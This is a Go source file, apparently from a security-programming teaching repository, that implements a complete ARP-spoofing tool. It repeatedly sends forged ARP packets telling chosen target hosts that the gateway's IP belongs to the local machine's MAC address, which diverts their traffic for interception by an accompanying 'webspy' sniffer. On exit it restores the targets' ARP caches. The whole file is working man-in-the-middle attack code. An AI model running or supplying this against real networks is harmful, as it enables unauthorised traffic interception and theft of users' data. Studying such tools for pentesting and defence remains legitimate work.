package arpspoof

import (
	"bytes"
	"encoding/binary"
	"net"
	"os"
	"os/signal"
	"time"

	"github.com/malfunkt/arpfox/arp"
	"github.com/malfunkt/iprange"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"sec-dev-in-action-src/sniffer/webspy/logger"
)

func ArpSpoof(DeviceName string, handler *pcap.Handle, flagTarget, gateway string) {
	iface, err := net.InterfaceByName(DeviceName)
	if err != nil {
		logger.Log.Fatalf("Could not use interface %s: %v", DeviceName, err)
	}
	var ifaceAddr *net.IPNet
	ifaceAddrs, err := iface.Addrs()
	if err != nil {
		logger.Log.Fatal(err)
	}

	for _, addr := range ifaceAddrs {
		if ipnet, ok := addr.(*net.IPNet); ok {
			if ip4 := ipnet.IP.To4(); ip4 != nil {
				ifaceAddr = &net.IPNet{
					IP:   ip4,
					Mask: net.IPMask([]byte{0xff, 0xff, 0xff, 0xff}),
				}
				break
			}
		}
	}

	if ifaceAddr == nil {
		logger.Log.Fatal("Could not get interface address.")
	}

	var targetAddrs []net.IP
	if flagTarget != "" {
		addrRange, err := iprange.ParseList(flagTarget)
		if err != nil {
			logger.Log.Fatal("Wrong format for target.")
		}
		targetAddrs = addrRange.Expand()
		if len(targetAddrs) == 0 {
			logger.Log.Fatalf("No valid targets given.")
		}
	}

	gatewayIP := net.ParseIP(gateway).To4()

	stop := make(chan struct{}, 2)

	// Waiting for ^C
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt)
	go func() {
		for {
			select {
			case <-c:
				logger.Log.Println("'stop' signal received; stopping...")
				close(stop)
				return
			}
		}
	}()

	go readARP(handler, stop, iface)

	// Get original source
	origSrc, err := arp.Lookup(binary.BigEndian.Uint32(gatewayIP))
	//origSrc, err := arp.Lookup(gatewayIP)
	if err != nil {
		logger.Log.Fatalf("Unable to lookup hw address for %s: %v", gatewayIP, err)
	}

	fakeSrc := arp.Address{
		IP:           gatewayIP,
		HardwareAddr: iface.HardwareAddr,
	}

	<-writeARP(handler, stop, targetAddrs, &fakeSrc, time.Duration(0.1*1000.0)*time.Millisecond)

	<-cleanUpAndReARP(handler, targetAddrs, origSrc)

	os.Exit(0)
}

func cleanUpAndReARP(handler *pcap.Handle, targetAddrs []net.IP, src *arp.Address) chan struct{} {
	logger.Log.Infof("Cleaning up and re-ARPing targets...")

	stopReARPing := make(chan struct{})
	go func() {
		t := time.NewTicker(time.Second * 5)
		<-t.C
		close(stopReARPing)
	}()

	return writeARP(handler, stopReARPing, targetAddrs, src, 500*time.Millisecond)
}

func writeARP(handler *pcap.Handle, stop chan struct{}, targetAddrs []net.IP, src *arp.Address, waitInterval time.Duration) chan struct{} {
	stoppedWriting := make(chan struct{})
	go func(stoppedWriting chan struct{}) {
		t := time.NewTicker(waitInterval)
		for {
			select {
			case <-stop:
				stoppedWriting <- struct{}{}
				return
			default:

				<-t.C
				for _, ip := range targetAddrs {
					arpAddr, err := arp.Lookup(binary.BigEndian.Uint32(ip))
					//arpAddr, err := arp.Lookup(ip)
					if err != nil {
						logger.Log.Errorf("Could not retrieve %v's MAC address: %v", ip, err)
						continue
					}
					dst := &arp.Address{
						IP:           ip,
						HardwareAddr: arpAddr.HardwareAddr,
					}
					buf, err := arp.NewARPRequest(src, dst)
					if err != nil {
						logger.Log.Error("NewARPRequest: ", err)
						continue
					}
					if err := handler.WritePacketData(buf); err != nil {
						logger.Log.Error("WritePacketData: ", err)
					}
				}
			}
		}
	}(stoppedWriting)
	return stoppedWriting
}

func readARP(handle *pcap.Handle, stop chan struct{}, iface *net.Interface) {
	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	in := src.Packets()
	for {
		var packet gopacket.Packet
		select {
		case <-stop:
			return
		case packet = <-in:
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			packet := arpLayer.(*layers.ARP)
			if !bytes.Equal([]byte(iface.HardwareAddr), packet.SourceHwAddress) {
				continue
			}
			if packet.Operation == layers.ARPReply {
				arp.Add(net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress))
			}
			logger.Log.Debugf("ARP packet (%d): %v (%v) -> %v (%v)", packet.Operation,
				net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress),
				net.IP(packet.DstProtAddress), net.HardwareAddr(packet.DstHwAddress))
		}
	}
}
